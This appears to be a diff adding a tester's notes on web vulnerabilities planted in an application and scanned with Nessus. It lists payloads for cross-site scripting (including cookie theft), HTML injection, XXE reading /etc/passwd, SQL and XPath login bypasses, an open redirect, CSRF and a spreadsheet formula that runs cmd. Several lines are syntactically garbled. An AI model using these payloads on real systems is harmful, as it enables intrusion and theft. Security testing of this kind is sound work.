@@ -1,0 +1,24 @@
+//Added the vulnerabilities in Application and then tested with Nessus tool
+//Injection attacks
+Cross Site scripting
+a) <input type="text" name="colour" value="#FF000"/>
+<input type="text" name="colour" value="#FF000"><script>alert("xss)</script>"/>
+b) <td>Hello, This is test</td><script>alert(document.cookie);</script></td>
+<style="background-color:#FF0000;width:50px;">->add any property
+HTML Injection
+#FF000"><h1>HtmlInjection</h1>
+hello</td><marquee>HTML Injection</marquee>
+XML External Entity(XXE) attack
+192.168.0.149/xml/example.php?xml=<test>Testing</test>
+192.168.0.149/xml/example.php?xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+XPATH Injection: 'or'1'='1
+SQL Injection:select * from users where idusers=3" LIMIT 1 or 3\ LIMIT 1
+select * from users where idusers='3' AND 1=1 --LIMIT 1
+select * from users where idusers='6765567' union select 1,2,3,4,5,6,7,8 --LIMIT 1
+Login Page: select * from users where username='admin'or'1'='1' and password='admin'or'1'='1'
+Un-validated Redirects:
+http://192.168.149.0/abc/index.php?page=redirectandlog.php&forwardurl=http:www.testingsite.com
+Cross-Site Request Forgery(CRSF):
+<html><body><img height="1" width="1" src="#&&string"</body></html>
+Formula Injection:
+@SUM(1+1)*cmd|' /C calc'!A0
